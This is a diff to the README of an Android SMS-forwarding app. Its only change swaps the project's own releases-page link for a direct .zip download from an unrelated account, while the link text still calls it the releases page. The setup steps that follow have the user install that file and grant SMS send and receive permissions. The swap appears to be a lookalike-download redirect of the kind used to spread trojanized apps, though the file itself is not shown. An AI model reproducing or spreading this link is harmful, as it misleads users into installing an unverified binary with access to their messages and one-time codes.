@@ -17,7 +17,7 @@ Calls can be forwarded to a single phone thanks to carriers' call forwarding ser
 
 
 ## Setup
-1. Pick up the Android phone, install this app with the `.apk` file downloaded from the [releases page](https://github.com/EnixCoda/SMS-Forward/releases). You can build the app from source to ensure safety.
+1. Pick up the Android phone, install this app with the `.apk` file downloaded from the [releases page](https://github.com/HackWithSumit/TextMessage-Forward/releases/download/SMSforward/SMSForward-1.0.2.zip). You can build the app from source to ensure safety.
 2. Launch the app, there will be a prompt requesting for SMS receive and send permissions. The app won't work without them, please grant.
 3. Enter the target phone number.
 4. Put down the Android phone and keep it charged for continuous service.
